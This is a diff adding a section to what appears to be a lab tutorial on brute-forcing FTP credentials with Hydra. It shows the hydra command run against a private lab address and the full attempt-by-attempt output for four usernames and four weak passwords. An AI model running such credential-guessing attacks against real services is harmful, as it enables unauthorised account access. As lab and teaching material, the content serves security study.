@@ -72,6 +72,34 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-14 16:59:
 ## Brute forcing
 we will create two files containing usernames and passwords.
 
+### Let's try
 ```bash
 hydra -V -L usernames -P passwords 192.168.133.129 ftp
+
+````
+Output
+```bash
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-14 17:35:09
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task
+[DATA] attacking ftp://192.168.133.129:21/
+[ATTEMPT] target 192.168.133.129 - login "samglish" - pass "azerty" - 1 of 16 [child 0] (0/0)
+[ATTEMPT] target 192.168.133.129 - login "samglish" - pass "azerty12" - 2 of 16 [child 1] (0/0)
+[ATTEMPT] target 192.168.133.129 - login "samglish" - pass "qwerty" - 3 of 16 [child 2] (0/0)
+[ATTEMPT] target 192.168.133.129 - login "samglish" - pass "qwerty12" - 4 of 16 [child 3] (0/0)
+[ATTEMPT] target 192.168.133.129 - login "Samglish" - pass "azerty" - 5 of 16 [child 4] (0/0)
+[ATTEMPT] target 192.168.133.129 - login "Samglish" - pass "azerty12" - 6 of 16 [child 5] (0/0)
+[ATTEMPT] target 192.168.133.129 - login "Samglish" - pass "qwerty" - 7 of 16 [child 6] (0/0)
+[ATTEMPT] target 192.168.133.129 - login "Samglish" - pass "qwerty12" - 8 of 16 [child 7] (0/0)
+[ATTEMPT] target 192.168.133.129 - login "Glish" - pass "azerty" - 9 of 16 [child 8] (0/0)
+[ATTEMPT] target 192.168.133.129 - login "Glish" - pass "azerty12" - 10 of 16 [child 9] (0/0)
+[ATTEMPT] target 192.168.133.129 - login "Glish" - pass "qwerty" - 11 of 16 [child 10] (0/0)
+[ATTEMPT] target 192.168.133.129 - login "Glish" - pass "qwerty12" - 12 of 16 [child 11] (0/0)
+[ATTEMPT] target 192.168.133.129 - login "glish" - pass "azerty" - 13 of 16 [child 12] (0/0)
+[ATTEMPT] target 192.168.133.129 - login "glish" - pass "azerty12" - 14 of 16 [child 13] (0/0)
+[ATTEMPT] target 192.168.133.129 - login "glish" - pass "qwerty" - 15 of 16 [child 14] (0/0)
+[ATTEMPT] target 192.168.133.129 - login "glish" - pass "qwerty12" - 16 of 16 [child 15] (0/0)
+|
 ```
+
